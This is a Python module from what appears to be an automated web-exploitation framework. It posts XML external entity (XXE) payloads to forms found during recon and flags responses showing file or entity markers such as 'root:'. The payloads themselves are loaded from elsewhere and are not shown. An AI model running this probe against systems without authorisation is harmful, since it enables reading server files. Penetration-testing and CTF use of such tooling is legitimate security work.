from __future__ import annotations
from core.module import ExploitModule
from core.models import ExploitResult
from core.payloads import get_payloads

class XXEModule(ExploitModule):
    name = "XXE"
    category = "parser"
    async def run(self, ctx):
        evidence=[]
        forms=ctx.artifacts.get("recon.forms",[]) or []
        xml_payloads=get_payloads(self.name)
        candidates=[f for f in forms if f.get("method")=="POST"]
        for form in candidates[:20]:
            action=form.get("action") or ctx.target.url
            for i,payload in enumerate(xml_payloads,1):
                ctx.logger(f"[payload {i}/{len(xml_payloads)}] XXE")
                try:
                    r=await ctx.http.request("POST",action,headers={"Content-Type":"application/xml","Accept":"*/*"},content=payload,follow_redirects=False)
                    ctx.inspect_source(str(r.url),r.text,payload,i,r.headers.get("content-type",""))
                    evidence.append(f"{action} -> {r.status_code}, {len(r.text)} bytes")
                    low = r.text.lower()
                    if "ctf-xxe-probe" in low or "localhost" in low or "root:" in low:
                        ctx.add_finding(action, payload, self.name, f"HTTP {r.status_code}; XML entity/file marker observed", confidence="high")
                        ctx.artifacts.set("xxe.hit", action)
                        return ExploitResult(self.name, "signal", "Potential XXE confirmed by entity/file marker", evidence=action)
                except Exception as exc: evidence.append(str(exc))
        return ExploitResult(self.name,"no-signal","XXE probes completed",evidence="\n".join(evidence[:20]))
